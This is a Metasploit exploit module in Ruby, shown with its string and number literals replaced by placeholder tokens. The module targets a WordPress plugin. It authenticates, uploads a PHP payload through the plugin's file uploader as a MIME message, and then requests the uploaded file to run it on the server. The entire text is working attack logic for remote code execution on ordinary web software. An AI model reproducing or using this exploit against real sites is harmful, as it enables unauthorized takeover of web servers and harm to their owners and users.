require <str> class Metasploit3 < Msf :: Exploit :: Remote Rank = ExcellentRanking include Msf :: Exploit :: FileDropper include Msf :: Exploit :: Remote :: HTTP :: Wordpress def initialize ( info = { } ) super ( update_info ( info , <str> = > <str> , <str> = > <str> , <str> = > MSF_LICENSE , <str> = > [ <str> , <str> ] , <str> = > [ [ <str> , <str> ] , [ <str> , <str> ] ] , <str> = > <str> , <str> = > <str> , <str> = > ARCH_PHP , <str> = > [ [ <str> , { } ] ] , <str> = > <int> ) ) register_options ( [ OptString . new ( <str> , [ false , <str> ] ) , OptString . new ( <str> , [ false , <str> ] ) , OptString . new ( <str> , [ false , <str> , <str> ] ) , OptBool . new ( <str> , [ false , <str> , false ] ) ] , self . class ) end def username datastore [ <str> ] end def password datastore [ <str> ] end def ec_password datastore [ <str> ] end def ec_password_is_hash datastore [ <str> ] end def use_wordpress_authentication username . to_s != <str> && password . to_s != <str> end def use_ec_authentication ec_password . to_s != <str> end def req_id if ec_password_is_hash return ec_password else return Rex :: Text . md5 ( ec_password ) end end def generate_mime_message ( payload , date_hash , name , include_req_id ) data = Rex :: MIME :: Message . new data . add_part ( date_hash , nil , nil , <str> ) data . add_part ( payload . encoded , <str> , nil , <str> name <str> ) data . add_part ( req_id , nil , nil , <str> ) if include_req_id data end def setup if ! use_wordpress_authentication && ! use_ec_authentication fail_with ( Failure :: BadConfig , <str> ) end super end def exploit vprint_status ( <str> ) if use_wordpress_authentication vprint_status ( <str> ) if use_ec_authentication if use_wordpress_authentication && use_ec_authentication print_status ( <str> ) end if use_wordpress_authentication print_status ( <str> username <str> password <str> ) cookie = wordpress_login ( username , password ) if ! cookie if use_ec_authentication print_warning ( <str> ) else fail_with ( Failure :: NoAccess , <str> ) end else print_good ( <str> ) end end print_status ( <str> ) payload_name = Rex :: Text . rand_text_alpha ( <int> ) date_hash = Rex :: Text . md5 ( Time . now . to_s ) uploaded_filename = <str> payload_name <str> date_hash <str> plugin_url = normalize_uri ( wordpress_url_plugins , <str> ) uploader_url = normalize_uri ( plugin_url , <str> , <str> , <str> , <str> ) payload_url = normalize_uri ( plugin_url , <str> , <str> , uploaded_filename ) data = generate_mime_message ( payload , date_hash , <str> payload_name <str> , use_ec_authentication ) print_status ( <str> payload_url <str> ) res = send_request_cgi ( <str> = > <str> , <str> = > uploader_url , <str> = > <str> data . bound <str> , <str> = > data . to_s , <str> = > cookie ) fail_with ( Failure :: Unreachable , <str> ) if res . nil? vprint_error ( <str> res . code <str> ) if res . code != <int> print_status ( <str> ) register_files_for_cleanup ( uploaded_filename ) res = send_request_cgi ( { <str> = > payload_url , <str> = > <str> } , <int> ) if ! res . nil? && res . code == <int> print_error ( <str> ) else print_good ( <str> ) end end end 
